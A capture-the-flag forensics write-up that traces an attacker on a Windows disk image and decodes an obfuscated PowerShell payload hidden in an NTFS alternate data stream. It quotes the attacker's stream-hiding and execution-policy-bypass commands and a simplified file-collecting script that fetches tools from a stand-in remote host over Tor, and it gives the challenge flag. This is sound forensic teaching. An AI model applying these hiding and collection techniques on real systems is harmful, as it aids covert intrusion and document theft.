# Artifact Of Dangerous Sighting

## Overview

**Artifact Of Dangerous Sighting** is a Hack The Box forensics challenge. The
goal is to analyze a Windows disk image, reconstruct an attacker's activity,
and uncover the code hidden inside an obfuscated PowerShell payload.

The supplied evidence is located in the `HostEvidence_PANDORA` directory and
contains the following VHDX image:

```text
2023-03-09T132449_PANDORA.vhdx
```

We can confirm its file type with `file`:

```bash
file HostEvidence_PANDORA/2023-03-09T132449_PANDORA.vhdx
```

```text
Microsoft Disk Image eXtended, by .NET DiscUtils
```

This confirms that the evidence is a Microsoft virtual disk. Mounting it on a
Windows system gives us access to what was originally the compromised
machine's `C:\` drive.

## 1. Mounting and preserving the evidence

During a forensic investigation, it is good practice to work on a copy of the
image and mount it as read-only whenever possible. On Windows, this can be
done through **Disk Management** by selecting `Action > Attach VHD` and
enabling the read-only option.

Once the volume is mounted, the most relevant artifacts for this investigation
are:

```text
C:\Users\Pandora\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\Tasks\ActiveSyncProvider.dll
```

## 2. PowerShell history

The `PSReadLine` history belonging to the **Pandora** user shows that someone
executed several PowerShell commands and later attempted to erase their
tracks. One command is particularly interesting:

```powershell
type finpayload > C:\Windows\Tasks\ActiveSyncProvider.dll:hidden.ps1
```

This command copies the contents of `finpayload` into a stream named
`hidden.ps1` attached to `ActiveSyncProvider.dll`. The DLL acts as a cover:
normally inspecting the directory only reveals the primary file, not the data
stored in its named stream.

The subsequent attempt to remove the PowerShell logs is another important
indicator. The absence of an expected log does not necessarily eliminate all
evidence of an action, because other logs and system artifacts may still
contain references to the process that was executed.

## 3. Correlating the Windows event logs

To look for additional evidence, we can convert `System.evtx` to XML with
[`python-evtx`](https://github.com/williballenthin/python-evtx) and filter for
entries related to PowerShell:

```bash
evtx_dump.py System.evtx | grep -i powershell
```

Among the results, we find the following process command line:

```xml
<Data Name="ImagePath">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass - &lt; C:\Windows\Tasks\ActiveSyncProvider.dll:hidden.ps1</Data>
```

This entry gives us three important pieces of information:

1. The interpreter used was `powershell.exe`.
2. `-ep bypass` disabled execution-policy restrictions for that process.
3. The input was read from `ActiveSyncProvider.dll:hidden.ps1`, rather than
   from the DLL's primary data stream.

This confirms that the artifact identified in the command history was
actually executed by the system.

## 4. Alternate Data Streams (ADS)

NTFS allows a file to contain more than one data stream. The unnamed stream
holds the data displayed when the file is opened normally, while named streams
are referenced with the following syntax:

```text
file:stream
```

In this case, the complete reference is:

```text
ActiveSyncProvider.dll:hidden.ps1
```

The challenge acronym, **ADS**, also matches *Alternate Data Streams*, giving
us an additional hint that this is the intended direction. We can enumerate
and extract the stream from PowerShell without executing its contents:

```powershell
Get-Item 'C:\Windows\Tasks\ActiveSyncProvider.dll' -Stream *
Get-Content 'C:\Windows\Tasks\ActiveSyncProvider.dll' -Stream 'hidden.ps1'
```

The stream can also be opened directly with Notepad:

```cmd
notepad C:\Windows\Tasks\ActiveSyncProvider.dll:hidden.ps1
```

Its contents reveal a PowerShell command that uses `-enc`, an abbreviation of
`-EncodedCommand`, followed by a Base64 string.

## 5. First layer: Base64 and UTF-16LE

Decoding only the Base64 makes the result appear to be full of null bytes.
The data is not corrupted: `powershell.exe -EncodedCommand` commonly expects
Unicode text encoded as **UTF-16LE**, where many ASCII characters are
represented using two bytes.

In CyberChef, the text can be recovered with the following recipe:

```text
From Base64
Decode text (UTF-16LE)
```

Another safe option is to decode it statically with Python. First save the
Base64 string as `payload.b64`, then run:

```bash
python3 -c "import base64; print(base64.b64decode(open('payload.b64').read().strip()).decode('utf-16le'))"
```

This operation reveals another PowerShell script, although it is still
obfuscated and uses variable names made from symbols:

```powershell
${[~@} = $()
${!!@!!]} = ++${[~@}
${[[!} = --${[~@} + ${!!@!!]} + ${!!@!!]}
${~~~]} = ${[[!} + ${!!@!!]}
# ...
${=@!~!} = "".("$(@{})"[14]+"$(@{})"[16]+"$(@{})"[21]+"$(@{})"[27]+"$?"[1]+"$(@{})"[3])
${@!=} = "["+"$(@{})"[7]+"$(@{})"[22]+"$(@{})"[20]+"$?"[1]+"]"
"[Char]35 + [Char]35 + ..." |& ${=@!~!}
```

The first variables generate numeric values, while the later expressions
dynamically construct command and operator names. The final line contains a
long sequence of `[Char]N` expressions and pipes the resulting string to
another command through `|&`. This is the payload's second layer.

## 6. Second layer: `[Char]` expressions

There is no need to execute the complete payload. To prevent `|&` from
invoking the reconstructed content, we remove that section and inspect or
evaluate only the character expression inside an isolated environment. Each
`[Char]N` element converts a decimal code into its corresponding Unicode
character:

```powershell
[Char]72 + [Char]84 + [Char]66
```

```text
HTB
```

Applying the same process to the full expression reveals the actual script.
Its relevant logic, simplified for readability, is shown below:

```powershell
function makePass {
    $alph = @()
    65..90 | ForEach-Object { $alph += [char]$_ }

    $num = @()
    48..57 | ForEach-Object { $num += [char]$_ }

    $res = $num + $alph | Sort-Object { Get-Random }
    return $res -join ''
}

function makeFileList {
    $files = cmd /c where /r $env:USERPROFILE `
        *.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt `
        *.txt *.csv *.htm *.html *.php
    return $files -split '\r'
}

function compress($Pass) {
    $tmp = $env:TEMP
    $server = 'https://relic-reclamation-anonymous.alien:1337/prog/'

    # Downloads 7z.dll and 7z.exe through a local SOCKS proxy.
    # It then compresses the discovered documents using $Pass.
}

$Pass = makePass
$fileList = @(makeFileList)
$fileResult = makeFileListTable $fileList
compress $Pass
$TopSecretCodeToDisableScript = "HTB{Y0U_C4nt_St0p_Th3_Alli4nc3}"
```

## 7. Payload behavior

The recovered payload behaves like a data collector or a rudimentary piece of
ransomware:

- It generates a random password by combining digits and uppercase letters.
- It recursively searches the user's profile for documents and other
  potentially valuable files.
- It downloads `7z.exe` and `7z.dll` through a SOCKS5 proxy listening on
  `localhost:9050`, a port commonly associated with a local Tor proxy.
- It compresses the discovered files into a password-protected ZIP archive and
  saves it to the desktop under a randomized name.
- Finally, it defines a variable named `TopSecretCodeToDisableScript`, whose
  value contains the flag.

The reconstructed chain of activity is therefore:

```text
finpayload
    -> hidden.ps1 ADS inside ActiveSyncProvider.dll
    -> PowerShell with ExecutionPolicy Bypass
    -> Base64 encoded as UTF-16LE
    -> obfuscation through [Char] expressions
    -> document discovery and compression script
    -> flag
```

## Flag

```text
HTB{Y0U_C4nt_St0p_Th3_Alli4nc3}
```

## Conclusion

The main difficulty of this challenge does not come from any single tool. It
comes from correlating several independent artifacts. The PowerShell history
reveals the creation of the alternate stream, `System.evtx` confirms its
execution, the `file:stream` syntax leads us to NTFS Alternate Data Streams,
and the two obfuscation layers ultimately expose both the payload's behavior
and the flag.

From a forensic perspective, this challenge also demonstrates that deleting
one source of logs does not erase every trace of an intrusion. User command
history, system events, and filesystem metadata can preserve complementary
pieces of the same activity.
